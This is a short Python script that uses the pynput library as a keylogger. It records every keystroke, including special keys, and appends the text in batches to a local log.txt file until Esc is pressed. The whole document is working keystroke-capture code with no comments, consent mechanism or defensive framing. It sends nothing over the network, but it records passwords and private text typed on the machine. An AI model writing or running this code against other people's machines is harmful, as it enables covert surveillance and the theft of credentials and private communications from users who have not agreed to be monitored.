import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

    if len(log) >= 50:
        write_log(log)
        log = ""

def write_log(log):
    with open("log.txt", "a") as f:
        f.write(log + "\n")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        write_log(log)
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
